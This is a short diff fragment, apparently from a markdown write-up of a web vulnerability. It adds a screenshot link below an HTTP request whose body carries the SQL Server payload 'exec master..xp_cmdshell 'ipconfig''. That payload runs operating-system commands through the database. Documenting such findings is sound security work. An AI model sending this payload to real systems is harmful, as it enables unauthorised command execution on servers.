@@ -9,5 +9,6 @@ Content-Type: text/plain
 Accept-Encoding: gzip
 
 exec master..xp_cmdshell 'ipconfig'
-
 ```
+
+![image-20241231151107209](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412311511460.png)
